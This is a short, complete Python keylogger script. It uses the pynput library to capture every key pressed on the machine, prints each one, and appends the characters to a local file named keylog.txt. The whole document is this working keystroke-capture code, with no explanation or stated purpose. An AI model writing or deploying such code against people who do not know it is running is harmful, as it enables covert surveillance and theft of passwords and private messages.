from pynput import keyboard

def KeyPressed(key):
      print(str(key))
      with open("keylog.txt", "a") as logkey:
            try:
                  char= key.char
                  logkey.write(char)
            except:
                  print("Error Getting char")

if __name__ == "__main__":
   
        listener = keyboard.Listener(on_press=KeyPressed)
        listener.start()
        input()